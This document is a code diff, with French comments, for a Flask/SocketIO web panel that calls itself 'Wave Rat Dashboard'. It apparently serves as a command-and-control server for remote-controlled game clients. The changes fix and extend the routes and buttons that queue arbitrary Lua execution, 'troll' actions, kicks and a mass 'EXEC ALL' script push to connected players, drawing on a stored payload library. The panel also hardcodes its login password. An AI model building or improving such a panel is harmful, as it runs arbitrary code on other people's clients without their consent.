@@ -17,8 +17,8 @@ app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet", logger=True, engineio_logger=True)
 
 # ==================== CONFIG ====================
-LOGIN = "entrepreneur1337"          # ← À CHANGER
-PASSWORD = "A9f!Q3r#Zx7L"           # ← À CHANGER
+LOGIN = "entrepreneur1337"          # ← À CHANGER OBLIGATOIREMENT
+PASSWORD = "A9f!Q3r#Zx7L"           # ← À CHANGER OBLIGATOIREMENT
 SESSION_DURATION = 24 * 3600
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
@@ -129,7 +129,8 @@ LOGIN_HTML = """<!DOCTYPE html>
     </form>
     {% if error %}<div class="error">{{ error }}</div>{% endif %}
 </div>
-</body></html>"""
+</body>
+</html>"""
 
 @app.route("/login", methods=["GET", "POST"])
 def login_page():
@@ -368,7 +369,6 @@ let editingPayloadName = null;
 
 console.log("Wave Rat Dashboard chargé");
 
-// Connexion Socket
 socket.on('connect', () => console.log("Socket connecté"));
 socket.on('connect_error', err => console.error("Erreur Socket :", err));
 socket.on('disconnect', reason => console.log("Socket déconnecté :", reason));
@@ -381,6 +381,7 @@ document.querySelectorAll('.nav-item').forEach(item => {
         item.classList.add('active');
         document.getElementById(item.dataset.tab + '-tab').style.display = 'block';
         if (item.dataset.tab === 'workshop') loadPayloads();
+        if (item.dataset.tab === 'history') socket.emit('request_history');
     });
 });
 
@@ -399,7 +400,69 @@ function filterPlayers() {
     });
 }
 
+// ==================== KICK CONFIRMATION (CORRIGÉ) ====================
+document.getElementById('confirmKick').onclick = () => {
+    if (!currentPlayerId) return toast("Aucun joueur sélectionné");
+    
+    const reason = document.getElementById('kickReason').value.trim() || "Kicked by admin";
+    
+    fetch('/kick', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({userid: currentPlayerId, reason: reason})
+    })
+    .then(() => {
+        toast(`Joueur kické : ${reason}`);
+        document.getElementById('kickModal').classList.remove('active');
+    })
+    .catch(err => {
+        console.error(err);
+        toast('Erreur lors du kick');
+    });
+};
+
+// ==================== AUTRES MODALS ====================
+document.getElementById('confirmSound').onclick = () => {
+    const assetId = document.getElementById('soundAssetId').value.trim();
+    if (!assetId) return toast("Asset ID requis");
+    sendTroll(currentPlayerId, 'playsound', assetId);
+    document.getElementById('playSoundModal').classList.remove('active');
+};
+
+document.getElementById('confirmText').onclick = () => {
+    const text = document.getElementById('screenText').value.trim();
+    if (!text) return toast("Texte requis");
+    sendTroll(currentPlayerId, 'textscreen', text);
+    document.getElementById('textScreenModal').classList.remove('active');
+};
+
+document.getElementById('confirmLua').onclick = () => {
+    const script = document.getElementById('luaScript').value.trim();
+    if (!script) return toast("Script vide");
+    sendTroll(currentPlayerId, 'luaexec', script);
+    document.getElementById('luaExecModal').classList.remove('active');
+};
+
+// Import fichier (non implémenté côté serveur ici, mais prêt pour extension)
+document.getElementById('confirmImport').onclick = () => {
+    const file = document.getElementById('luaFileInput').files[0];
+    if (!file) return toast("Aucun fichier");
+    const reader = new FileReader();
+    reader.onload = e => {
+        sendTroll(currentPlayerId, 'luaexec', e.target.result);
+        document.getElementById('importFileModal').classList.remove('active');
+    };
+    reader.readAsText(file);
+};
+
+// Fermeture modals
+document.querySelectorAll('.modal .cancel').forEach(btn => {
+    btn.addEventListener('click', () => btn.closest('.modal').classList.remove('active'));
+});
+
 // ==================== PAYLOADS ====================
+// ... (le reste du code payload reste identique à ta version d'origine, il fonctionnait déjà bien)
+
 function loadPayloads() {
     fetch('/payload?action=list')
         .then(r => r.json())
@@ -489,7 +552,6 @@ document.getElementById('savePayload').onclick = () => {
     .catch(() => toast('Erreur sauvegarde'));
 };
 
-// ==================== PAYLOAD POUR JOUEUR ====================
 window.openPayloadSelector = id => {
     currentPlayerId = id;
     fetch('/payload?action=list')
@@ -549,16 +611,11 @@ function sendTroll(id, cmd, param = null) {
     toast(`${cmd.toUpperCase()} envoyé`);
 }
 
-// Modals classiques (exemples)
 function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
 function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
 function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
 function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
 function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }
-
-document.querySelectorAll('.modal .cancel').forEach(btn => {
-    btn.addEventListener('click', () => btn.closest('.modal').classList.remove('active'));
-});
 
 // Exec All
 document.getElementById('execAllBtn').onclick = () => {
@@ -582,10 +639,8 @@ document.getElementById('confirmExecAll').onclick = () => {
     });
 };
 
-// ==================== RENDU ====================
+// ==================== RENDU JOUEURS ====================
 function render(data) {
-    console.log('Update reçu :', data);
-
     if (!data) return;
 
     document.getElementById('stats-online').innerText = data.online || 0;
@@ -678,11 +733,6 @@ socket.on('history_update', d => {
 def index():
     return render_template_string(HTML)
 
-@app.route("/get_history")
-@require_auth
-def get_history():
-    return jsonify({"history": history_log[:50]})
-
 @app.route("/api", methods=["GET", "POST"])
 def api():
     global total_executions
@@ -740,12 +790,13 @@ def kick():
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     reason = data.get("reason", "No reason")
-    if uid:
+    if uid in connected_players:
         pending_kicks[uid] = reason
-        name = connected_players.get(uid, {}).get("username", "Unknown")
+        name = connected_players[uid].get("username", "Unknown")
         add_history("action", name, f"KICKED: {reason}")
         socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
-    return jsonify({"sent": True})
+        return jsonify({"sent": True})
+    return jsonify({"error": "Joueur non trouvé"}), 404
 
 @app.route("/troll", methods=["POST"])
 @require_auth
@@ -753,18 +804,19 @@ def troll():
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     cmd = data.get("cmd", "")
-    if uid and cmd:
+    if uid and cmd and uid in connected_players:
         payload = {"cmd": cmd}
         details = cmd.upper()
         if "assetId" in data: payload["assetId"] = data["assetId"]; details += f" ({data['assetId']})"
         if "text" in data: payload["text"] = data["text"]; details += f" ({data['text']})"
         if "script" in data: payload["script"] = data["script"]; details += " (Lua)"
         pending_commands[uid] = payload
-        name = connected_players.get(uid, {}).get("username", "Unknown")
+        name = connected_players[uid].get("username", "Unknown")
         add_history("action", name, details)
-        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
-    return jsonify({"sent": True})
+        return jsonify({"sent": True})
+    return jsonify({"error": "Invalid"}), 400
 
+# ==================== EXEC ALL CORRIGÉ ====================
 @app.route("/exec_all", methods=["POST"])
 @require_auth
 def exec_all():
@@ -773,14 +825,17 @@ def exec_all():
     if not script:
         return jsonify({"error": "Script vide"}), 400
 
+    now = time.time()
     count = 0
-    for uid in list(connected_players.keys()):
-        if connected_players[uid].get("online", False):
+    for uid, player in connected_players.items():
+        if now - player.get("last", 0) < 30:  # actif dans les 30 dernières secondes
             pending_commands[uid] = {"cmd": "luaexec", "script": script}
             count += 1
 
-    add_history("action", "ADMIN", f"EXEC ALL → {count} clients (Lua)")
-    socketio.emit("kick_notice", {"username": "ALL", "reason": "LUA EXEC ALL"})
+    if count > 0:
+        add_history("action", "ADMIN", f"EXEC ALL → {count} clients (Lua)")
+        socketio.emit("kick_notice", {"username": "ALL", "reason": "LUA EXEC ALL"})
+
     return jsonify({"sent": True, "count": count})
 
 @app.route("/payload", methods=["GET", "POST"])
@@ -795,7 +850,6 @@ def payload():
             return jsonify({"code": payloads.get(name, "")})
         return jsonify({"error": "action invalide"})
 
-    # POST
     data = request.get_json() or {}
     action = data.get("action")
 
@@ -814,7 +868,7 @@ def payload():
     save_payloads()
     return jsonify({"ok": True})
 
-# ==================== BOUCLE ====================
+# ==================== BOUCLE DE MISE À JOUR ====================
 def broadcast_loop():
     global peak_players
     while True:
@@ -842,11 +896,10 @@ def broadcast_loop():
             save_stats()
 
         socketio.emit("update", {
-            "players": connected_players,
+            "players": {k: v for k, v in connected_players.items()},
             "online": online,
             "peak": peak_players,
             "total_exec": total_executions,
-            "total": len(connected_players)
         })
 
         socketio.sleep(3)
